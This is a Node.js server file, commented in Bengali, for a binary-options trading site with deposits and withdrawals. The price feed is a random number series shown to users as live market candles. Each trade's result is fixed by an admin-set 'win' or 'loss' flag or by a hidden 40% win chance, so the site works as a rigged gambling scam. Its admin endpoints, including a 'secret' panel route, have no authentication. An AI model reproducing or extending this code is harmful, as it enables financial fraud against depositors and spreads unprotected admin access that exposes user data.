const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let users = {
  "demo_user": { balance: 1000, control: "normal" }
};
let transactions = [];

// লাইফ-টাইম ক্যান্ডেল স্টোরেজ (ফাইল থেকে লোড বা নতুন তৈরি)
const DATA_FILE = path.join(__dirname, 'candles_history.json');
let candleHistory = [];
let currentPrice = 1.08500;

if (fs.existsSync(DATA_FILE)) {
  try {
    candleHistory = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
    if (candleHistory.length > 0) {
      currentPrice = candleHistory[candleHistory.length - 1].close;
    }
  } catch (e) {
    candleHistory = [];
  }
}

// হিস্ট্রি না থাকলে প্রাথমিক ২০টি ৬০-সেকেন্ডের ক্যান্ডেল তৈরি
if (candleHistory.length === 0) {
  let nowMinute = Math.floor(Date.now() / 60000) * 60;
  for (let i = 25; i > 0; i--) {
    let t = nowMinute - (i * 60);
    let o = currentPrice;
    let delta = (Math.random() - 0.49) * 0.00045;
    let c = parseFloat((o + delta).toFixed(5));
    let h = parseFloat((Math.max(o, c) + Math.random() * 0.00025).toFixed(5));
    let l = parseFloat((Math.min(o, c) - Math.random() * 0.00025).toFixed(5));
    candleHistory.push({ time: t, open: o, high: h, low: l, close: c });
    currentPrice = c;
  }
}

// বর্তমান চলমান ১ মিনিটের ক্যান্ডেল
let currentMinuteEpoch = Math.floor(Date.now() / 60000) * 60;
let currentCandle = {
  time: currentMinuteEpoch,
  open: currentPrice,
  high: currentPrice,
  low: currentPrice,
  close: currentPrice
};

// প্রতি ১ সেকেন্ডে মার্কেট প্রাইস টিক ও ক্যান্ডেল আপডেট
setInterval(() => {
  let delta = (Math.random() - 0.495) * 0.00010;
  currentPrice = parseFloat((currentPrice + delta).toFixed(5));

  let nowMinute = Math.floor(Date.now() / 60000) * 60;

  // ঠিক ৬০ সেকেন্ড পূর্ণ হলে ক্যান্ডেল হিস্ট্রিতে পার্মানেন্ট সেভ হবে এবং নতুন ক্যান্ডেল শুরু হবে
  if (nowMinute > currentCandle.time) {
    candleHistory.push({ ...currentCandle });
    
    // লোকাল ফাইলে পার্মানেন্ট সেভ (সার্ভার রিস্টার্ট হলেও ক্যান্ডেল মুছে যাবে না)
    fs.writeFileSync(DATA_FILE, JSON.stringify(candleHistory));

    currentCandle = {
      time: nowMinute,
      open: currentPrice,
      high: currentPrice,
      low: currentPrice,
      close: currentPrice
    };
  } else {
    // বর্তমান ৬০ সেকেন্ডের ক্যান্ডেল আপডেট
    if (currentPrice > currentCandle.high) currentCandle.high = currentPrice;
    if (currentPrice < currentCandle.low) currentCandle.low = currentPrice;
    currentCandle.close = currentPrice;
  }

  let remainingSeconds = 60 - Math.floor((Date.now() / 1000) % 60);

  // ব্রডকাস্ট ডেটা
  let payload = JSON.stringify({
    type: 'TICK',
    price: currentPrice.toFixed(5),
    candle: currentCandle,
    history: candleHistory,
    countdown: remainingSeconds
  });

  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(payload);
    }
  });
}, 1000);

// ট্রেড লজিক
app.post('/api/trade', (req, res) => {
  const { username, amount, direction } = req.body;
  let user = users[username] || { balance: 1000, control: 'normal' };

  if (user.balance < amount) {
    return res.json({ success: false, message: "অপর্যাপ্ত ব্যালেন্স!" });
  }

  let isWin = false;
  if (user.control === 'win') isWin = true;
  else if (user.control === 'loss') isWin = false;
  else isWin = (Math.random() * 100) < 40; // ডিফল্ট ৪০% উইন চান্স

  let profit = isWin ? amount * 1.85 : 0;
  if (isWin) user.balance += (profit - amount);
  else user.balance -= amount;

  res.json({ success: true, isWin, balance: user.balance, profit });
});

// অ্যাডমিন লিংক রুট (সরাসরি /admin এবং /admin-secret-panel উভয়ই কাজ করবে)
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});
app.get('/admin-secret-panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/api/admin/data', (req, res) => {
  let totalDeposit = transactions.filter(t => t.type === 'Deposit' && t.status === 'Approved').reduce((s, t) => s + Number(t.amount), 0);
  let totalWithdraw = transactions.filter(t => t.type === 'Withdraw' && t.status === 'Approved').reduce((s, t) => s + Number(t.amount), 0);
  res.json({ users, transactions, totalDeposit, totalWithdraw });
});

app.post('/api/admin/action', (req, res) => {
  const { username, action, value } = req.body;
  if (users[username]) {
    if (action === 'control') users[username].control = value;
    res.json({ success: true });
  } else res.json({ success: false });
});

app.post('/api/admin/tx-action', (req, res) => {
  const { txId, status } = req.body;
  let tx = transactions.find(t => t.id == txId);
  if (tx) {
    tx.status = status;
    res.json({ success: true });
  } else res.json({ success: false });
});

app.post('/api/deposit', (req, res) => {
  const { username, method, amount, trxId } = req.body;
  transactions.push({ id: Date.now(), username, type: 'Deposit', method, amount, trxId, status: 'Pending' });
  res.json({ success: true, message: "ডিপোজিট রিকোয়েস্ট জমা হয়েছে!" });
});

app.post('/api/withdraw', (req, res) => {
  const { username, method, amount, accountNo } = req.body;
  let user = users[username];
  if (user && user.balance >= amount) {
    user.balance -= Number(amount);
    transactions.push({ id: Date.now(), username, type: 'Withdraw', method, amount, accountNo, status: 'Pending' });
    res.json({ success: true, message: "উইথড্র রিকোয়েস্ট সফল হয়েছে!" });
  } else res.json({ success: false, message: "অপর্যাপ্ত ব্যালেন্স!" });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
